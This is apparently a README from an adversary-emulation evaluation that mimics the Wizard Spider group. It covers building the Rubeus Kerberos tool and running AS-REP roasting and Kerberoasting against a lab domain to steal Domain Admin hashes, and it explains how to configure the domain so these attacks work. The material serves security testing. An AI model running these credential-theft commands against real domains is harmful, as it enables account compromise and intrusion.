# Rubeus

"Rubeus is a C# toolset for raw Kerberos interaction and abuses." 

The goal for this evaluation is to steal the hash of the Domain Admin as a Domain User.  

### Build Instructions

Open the command prompt (cmd.exe), navigate to directory containing the Rubeus Visual Studio solution file (Rubeus.sln), and run the devenv.exe command:

	cd wizard_spider\Resources\Rubeus
	"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\devenv.exe" Rubeus.sln /build Release
	
	# alternate build command
	"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\msbuild.exe" Rubeus.sln -property:Configuration=Release

The executable will be found in the bin\Release folder.

### Test Instructions
Open PowerShell

	cd wizard_spider\Resources\Rubeus\
	rubeus_test.ps1

### Usage Examples

	# execute AS-Rep Roast
	rubeus.exe asreproast /domain:oz.local
	
	# execute Kerberoast
	# must be executed as a domain user (oz\user) NOT a local user (dorothy\user)
	# may want to consider adding /format:hashcat as an argument (default format is John)
	rubeus.exe kerberoast /domain:oz.local

### Cleanup Instructions 
Open a command prompt or PowerShell

	del rubeus.exe

### Misc
Conditions required to successfully compromise the Domain Admin password via Kerberoasting during the evaluation:
- The Domain Admin must have a crackable password

- The Domain Admin must have a Service Principal Name (SPN) associated with their account 

	```
	# Example command to set the SPN: 
	setspn -s exchange/oz.local oz/kfleming 
	```


Additionally, the CTI indicates the adversary also attempts AS-Rep Roasting. For this to work, Kerberos pre-authentication must be disabled (not done by default). 

  ```
Log into Domain Controller 
Run (Windows-R) dsa.msc 
Select Domain Admin account 
Go to the Account tab 
In account options, check 'Do not require Kerberos preauthentication' 
  ```

### CTI Evidence
https://attack.mitre.org/groups/G0102/  
https://thedfirreport.com/2020/10/08/ryuks-return/  
https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/  

### References
https://github.com/GhostPack/Rubeus  
https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx  
https://blog.zsec.uk/path2da-pt2/  
https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019  
